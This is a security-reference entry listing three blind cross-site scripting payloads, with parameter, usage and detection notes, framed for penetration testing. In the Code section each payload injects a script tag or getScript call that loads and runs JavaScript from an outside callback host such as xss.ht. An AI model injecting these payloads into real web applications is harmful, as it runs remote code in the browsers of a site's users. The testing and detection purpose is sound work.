---
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:42.202216+00:00'
updated_at: '2023-04-10T20:21:54.451331+00:00'
tags:
  - '[[tags/Blind XSS]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/XSS Hunter]]'
platforms:
  - Web
validated: true
---

# Blind-XSS-External-Script-Payloads

## Code

```xml
"><script src="https://js.rip/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
```

## Description

This code snippet contains multiple blind XSS payloads designed to inject and execute external JavaScript in the context of a victim's browser. The payloads close an open tag (e.g., ">) and load scripts from attacker-controlled domains, triggering a callback to confirm execution. These are useful for testing non-visible injection points like logs or internal tools, where direct output isn't observable.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <custom.name> | Unique identifier for the payload instance on js.rip | victim-session-123 |
| <custom.subdomain> | Attacker's subdomain on xss.ht or similar service | attacker.xss.ht |

## Usage

Inject these payloads into web application input fields, URL parameters, or forms suspected of blind XSS vulnerabilities. For example, in a comment field: `<img src=x onerror="...">` can be replaced with one of these. Monitor the external domain (js.rip or xss.ht) for incoming requests, which indicate successful execution. These payloads can be customized to evade basic filters and are often used in penetration testing or red team engagements to detect hidden XSS flaws.

## Detection

- Web Application Firewalls (WAFs) may flag external script src attributes or unencoded "> sequences in inputs.
- Browser developer tools or proxy logs can reveal anomalous script loads from unknown domains.
- Server-side logging of external requests to domains like xss.ht can alert defenders to potential scans.
- Content Security Policy (CSP) violations in browser consoles if external scripts are blocked.

## Related

- [[procedures/Blind-XSS-Detection-Using-External-Payloads]]
